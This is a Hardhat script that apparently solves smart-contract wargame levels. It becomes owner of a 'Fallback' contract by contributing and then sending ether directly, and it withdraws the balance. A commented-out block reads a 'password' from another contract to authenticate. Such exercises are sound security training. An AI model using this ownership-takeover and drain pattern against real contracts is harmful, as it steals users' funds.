const { ethers } = require("hardhat");

async function main() {

    const contractAddress = "0x1c9984e6edB2f12C344c2D04881B03481e7aC426";
    
    const instance = await hre.ethers.getContractAt("IFallback", contractAddress);
    let tx = await instance.contribute({value: ethers.utils.parseEther("0.0001")});
    await tx.wait()

    const signers = await ethers.getSigners();
    const [owner] = signers;
    console.log(await instance.callStatic.getContribution())
    tx = await owner.sendTransaction({
        to: contractAddress,
        value: ethers.utils.parseEther("0.0001")
    })
    await tx.wait();

    tx = await instance.withdraw();
    await tx.wait();

    /*const contractAddress = "0x9bD2Daf5d86269262bbD0B885fF9DacdcCf4d227";
    const instance = await hre.ethers.getContractAt("IInstance", contractAddress);
    const password = await instance.callStatic.password();
    const tx = await instance.authenticate(password);

    console.log(tx);*/
};

  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });